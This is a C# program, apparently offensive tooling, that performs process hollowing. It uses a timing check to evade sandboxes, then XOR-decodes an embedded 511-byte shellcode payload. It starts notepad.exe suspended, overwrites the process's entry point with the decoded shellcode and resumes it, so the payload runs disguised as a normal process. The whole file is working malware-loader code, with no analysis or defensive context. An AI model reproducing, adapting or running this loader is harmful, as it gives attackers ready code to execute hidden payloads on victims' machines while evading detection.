using System;
using System.Runtime.InteropServices;

namespace PHollow
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            DateTime thymer = DateTime.Now;
            Sleep(10000);
            double Thymer = DateTime.Now.Subtract(thymer).TotalSeconds;
            if (Thymer < 9.5)
            {
                return;
            }

            byte[] buffer = new byte[511] {
            0x6a, 0xde, 0x15, 0x72, 0x66, 0x7e, 0x5a, 0x96, 0x96, 0x96, 0xd7, 0xc7, 0xd7, 0xc6, 0xc4,
            0xde, 0xa7, 0x44, 0xc7, 0xc0, 0xf3, 0xde, 0x1d, 0xc4, 0xf6, 0xde, 0x1d, 0xc4, 0x8e, 0xde,
            0x1d, 0xc4, 0xb6, 0xde, 0x1d, 0xe4, 0xc6, 0xde, 0x99, 0x21, 0xdc, 0xdc, 0xdb, 0xa7, 0x5f,
            0xde, 0xa7, 0x56, 0x3a, 0xaa, 0xf7, 0xea, 0x94, 0xba, 0xb6, 0xd7, 0x57, 0x5f, 0x9b, 0xd7,
            0x97, 0x57, 0x74, 0x7b, 0xc4, 0xde, 0x1d, 0xc4, 0xb6, 0xd7, 0xc7, 0x1d, 0xd4, 0xaa, 0xde,
            0x97, 0x46, 0xf0, 0x17, 0xee, 0x8e, 0x9d, 0x94, 0x99, 0x13, 0xe4, 0x96, 0x96, 0x96, 0x1d,
            0x16, 0x1e, 0x96, 0x96, 0x96, 0xde, 0x13, 0x56, 0xe2, 0xf1, 0xde, 0x97, 0x46, 0xd2, 0x1d,
            0xd6, 0xb6, 0x1d, 0xde, 0x8e, 0xdf, 0x97, 0x46, 0xc6, 0x75, 0xc0, 0xdb, 0xa7, 0x5f, 0xde,
            0x69, 0x5f, 0xd7, 0x1d, 0xa2, 0x1e, 0xde, 0x97, 0x40, 0xde, 0xa7, 0x56, 0xd7, 0x57, 0x5f,
            0x9b, 0x3a, 0xd7, 0x97, 0x57, 0xae, 0x76, 0xe3, 0x67, 0xda, 0x95, 0xda, 0xb2, 0x9e, 0xd3,
            0xaf, 0x47, 0xe3, 0x4e, 0xce, 0xd2, 0x1d, 0xd6, 0xb2, 0xdf, 0x97, 0x46, 0xf0, 0xd7, 0x1d,
            0x9a, 0xde, 0xd2, 0x1d, 0xd6, 0x8a, 0xdf, 0x97, 0x46, 0xd7, 0x1d, 0x92, 0x1e, 0xde, 0x97,
            0x46, 0xd7, 0xce, 0xd7, 0xce, 0xc8, 0xcf, 0xcc, 0xd7, 0xce, 0xd7, 0xcf, 0xd7, 0xcc, 0xde,
            0x15, 0x7a, 0xb6, 0xd7, 0xc4, 0x69, 0x76, 0xce, 0xd7, 0xcf, 0xcc, 0xde, 0x1d, 0x84, 0x7f,
            0xdd, 0x69, 0x69, 0x69, 0xcb, 0xdf, 0x28, 0xe1, 0xe5, 0xa4, 0xc9, 0xa5, 0xa4, 0x96, 0x96,
            0xd7, 0xc0, 0xdf, 0x1f, 0x70, 0xde, 0x17, 0x7a, 0x36, 0x97, 0x96, 0x96, 0xdf, 0x1f, 0x73,
            0xdf, 0x2a, 0x94, 0x96, 0x97, 0x2d, 0x56, 0x3e, 0x96, 0x61, 0xd7, 0xc2, 0xdf, 0x1f, 0x72,
            0xda, 0x1f, 0x67, 0xd7, 0x2c, 0xda, 0xe1, 0xb0, 0x91, 0x69, 0x43, 0xda, 0x1f, 0x7c, 0xfe,
            0x97, 0x97, 0x96, 0x96, 0xcf, 0xd7, 0x2c, 0xbf, 0x16, 0xfd, 0x96, 0x69, 0x43, 0xfc, 0x9c,
            0xd7, 0xc8, 0xc6, 0xc6, 0xdb, 0xa7, 0x5f, 0xdb, 0xa7, 0x56, 0xde, 0x69, 0x56, 0xde, 0x1f,
            0x54, 0xde, 0x69, 0x56, 0xde, 0x1f, 0x57, 0xd7, 0x2c, 0x7c, 0x99, 0x49, 0x76, 0x69, 0x43,
            0xde, 0x1f, 0x51, 0xfc, 0x86, 0xd7, 0xce, 0xda, 0x1f, 0x74, 0xde, 0x1f, 0x6f, 0xd7, 0x2c,
            0x0f, 0x33, 0xe2, 0xf7, 0x69, 0x43, 0x13, 0x56, 0xe2, 0x9c, 0xdf, 0x69, 0x58, 0xe3, 0x73,
            0x7e, 0x05, 0x96, 0x96, 0x96, 0xde, 0x15, 0x7a, 0x86, 0xde, 0x1f, 0x74, 0xdb, 0xa7, 0x5f,
            0xfc, 0x92, 0xd7, 0xce, 0xde, 0x1f, 0x6f, 0xd7, 0x2c, 0x94, 0x4f, 0x5e, 0xc9, 0x69, 0x43,
            0x15, 0x6e, 0x96, 0xe8, 0xc3, 0xde, 0x15, 0x52, 0xb6, 0xc8, 0x1f, 0x60, 0xfc, 0xd6, 0xd7,
            0xcf, 0xfe, 0x96, 0x86, 0x96, 0x96, 0xd7, 0xce, 0xde, 0x1f, 0x64, 0xde, 0xa7, 0x5f, 0xd7,
            0x2c, 0xce, 0x32, 0xc5, 0x73, 0x69, 0x43, 0xde, 0x1f, 0x55, 0xdf, 0x1f, 0x51, 0xdb, 0xa7,
            0x5f, 0xdf, 0x1f, 0x66, 0xde, 0x1f, 0x4c, 0xde, 0x1f, 0x6f, 0xd7, 0x2c, 0x94, 0x4f, 0x5e,
            0xc9, 0x69, 0x43, 0x15, 0x6e, 0x96, 0xeb, 0xbe, 0xce, 0xd7, 0xc1, 0xcf, 0xfe, 0x96, 0xd6,
            0x96, 0x96, 0xd7, 0xce, 0xfc, 0x96, 0xcc, 0xd7, 0x2c, 0x9d, 0xb9, 0x99, 0xa6, 0x69, 0x43,
            0xc1, 0xcf, 0xd7, 0x2c, 0xe3, 0xf8, 0xdb, 0xf7, 0x69, 0x43, 0xdf, 0x69, 0x58, 0x7f, 0xaa,
            0x69, 0x69, 0x69, 0xde, 0x97, 0x55, 0xde, 0xbf, 0x50, 0xde, 0x13, 0x60, 0xe3, 0x22, 0xd7,
            0x69, 0x71, 0xce, 0xfc, 0x96, 0xcf, 0x2d, 0x76, 0x8b, 0xbc, 0x9c, 0xd7, 0x1f, 0x4c, 0x69,
            0x43
            };


            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\notepad.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);


            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);

            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);

            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);

            uint rvaOffset = e_lfanew + 0x28;

            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);

            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);

            for (int i = 0; i < buffer.Length; i++)
            {
                buffer[i] = (byte)((uint)buffer[i] ^ 25678998);
            }

            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buffer, buffer.Length, out bytesRW);

            uint rResult = ResumeThread(pInfo.hThread);
        }
    }
}
